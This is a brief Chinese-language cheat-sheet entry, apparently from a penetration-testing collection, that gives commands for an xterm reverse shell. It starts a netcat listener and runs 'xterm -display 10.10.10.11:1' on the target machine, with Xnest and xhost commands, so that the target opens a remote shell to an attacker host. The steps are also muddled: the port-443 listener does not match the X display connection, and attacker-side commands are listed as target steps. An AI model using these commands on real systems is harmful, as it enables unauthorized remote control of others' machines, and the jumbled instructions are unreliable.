# nXterm反弹shell

首先在本地监听TCP协议443端口

```bash
nc -lvp 443

```

然后在靶机上执行如下命令：

```bash
xterm -display 10.10.10.11:1
Xnest :1
xhost +targetip

```

